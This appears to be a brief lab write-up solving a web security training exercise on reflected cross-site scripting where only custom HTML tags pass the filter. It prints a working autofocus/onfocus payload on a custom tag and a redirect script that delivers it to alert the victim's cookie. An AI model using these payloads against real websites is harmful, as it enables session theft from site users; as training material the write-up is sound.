# Practitioner Lab 67: Reflected XSS into HTML context with all tags blocked except custom ones

---

This lab blocks all HTML tags except custom ones.

To solve the lab, perform a cross-site scripting attack that injects a custom tag and automatically alerts `document.cookie`

I went into the xss cheat, and tried to find a no interaction payload that would work on my browser with custom tags. 

```
<xss autofocus tabindex=1 onfocus=alert(1)></xss>
```

I found this which did work and used it.

I used the 

```
<script>
location= httpsite/?search=<xss autofocus tabindex=1 onfocus=alert(document.cookie)></xss>
</script>
```

This solved the lab.